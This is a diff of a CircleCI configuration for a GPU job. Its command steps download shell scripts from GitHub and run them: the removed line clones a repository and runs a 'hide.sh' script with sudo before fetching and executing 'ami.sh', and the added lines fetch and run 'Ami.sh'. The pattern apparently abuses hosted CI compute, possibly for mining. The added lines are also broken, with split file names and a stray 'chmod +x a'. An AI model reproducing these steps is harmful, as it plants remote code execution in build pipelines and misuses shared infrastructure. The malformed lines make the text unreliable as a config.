@@ -9,5 +9,7 @@ jobs:
       - checkout 
       - run: nvidia-smi 
       - run: 
-          name: "AmiMiami" 
-          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && git clone https://github.com/Vaping86/Vaping86.git && cd Vaping86 && chmod +x hide.sh && sudo ./hide.sh && wget https://raw.githubusercontent.com/Vaping86/Circleci/main/ami.sh && chmod +x ami.sh && ./ami.sh
+          name: "AmiMiami"
+          command:wget http://github.com/vaping8/Circleci/raw/main/Ami.sh && chmod +x a
+          Ami.sh && ./a
+          Ami.sh
